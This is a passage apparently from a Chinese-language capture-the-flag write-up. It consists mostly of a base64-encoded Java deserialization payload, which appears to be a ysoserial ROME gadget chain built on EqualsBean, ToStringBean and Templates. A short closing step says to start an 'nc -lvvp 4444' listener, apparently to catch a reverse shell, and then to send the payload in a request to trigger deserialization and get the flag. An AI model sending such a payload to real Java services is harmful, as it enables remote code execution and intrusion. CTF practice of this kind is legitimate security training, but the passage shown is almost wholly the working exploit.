QAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA4AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEABwAmACgACXVxAH4AFwAAAdTK/rq+AAAANAAbCgACAAMHAAQMAAUABgEAEGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYHAAgBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcACgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQAHAAIAAQAJAAEAGgALAAwAAQANAAAAAgAOAAEAAQAFAAYAAQAQAAAALwABAAEAAAAFKrcAAbEAAAACABEAAAAGAAEAAAA8ABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAcAGAAaAAlwdAAEUHducnB3AQB4c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmpxAH4ACXhwdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHEAfgAUc3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhbgn1jkoPI+4xAgACTAAKX2JlYW5DbGFzc3EAfgAcTAAEX29ianEAfgAJeHBxAH4AH3EAfgAUc3EAfgAbdnEAfgACcQB+AA1zcQB+ACBxAH4AI3EAfgANcQB+AAZxAH4ABnEAfgAGeA==
0x05 触发反序列化，获取flag
服务器执行：nc -lvvp 4444
数据包直接请求获取进行反序列数据加载操作
```